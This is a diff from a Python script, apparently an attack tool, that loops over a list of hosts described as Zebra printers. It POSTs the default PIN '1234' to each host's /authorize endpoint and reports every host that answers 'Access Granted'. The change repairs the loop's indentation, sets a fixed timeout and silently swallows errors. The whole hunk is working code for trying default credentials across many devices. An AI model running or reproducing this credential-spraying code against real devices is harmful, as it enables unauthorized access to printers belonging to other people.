@@ -680,14 +680,15 @@ if rows:
 	if choice in yes:
 		for row in rows:
 			#print(row[0])
-			zebra.payload = {"0": "1234"}
+			payload = {"0": "1234"}
 			url = f"http://{row[0]}/authorize"
 			try:
-                # Send the POST request using the requests library
-                response = requests.post(url, data=payload, timeout=timeout_seconds)
-	            if "Access Granted" in response.text:
-    	            print(f"[+] Access Granted for {row[0]}")
-				
+			    # Send the POST request using the requests library
+			    response = requests.post(url, data=payload, timeout=5)
+			    if "Access Granted" in response.text:
+			         print(f"[+] Access Granted for {row[0]}")
+			except:
+				pass
 		print("END -- Zebra printers above")
 	elif choice in no:
 		pass
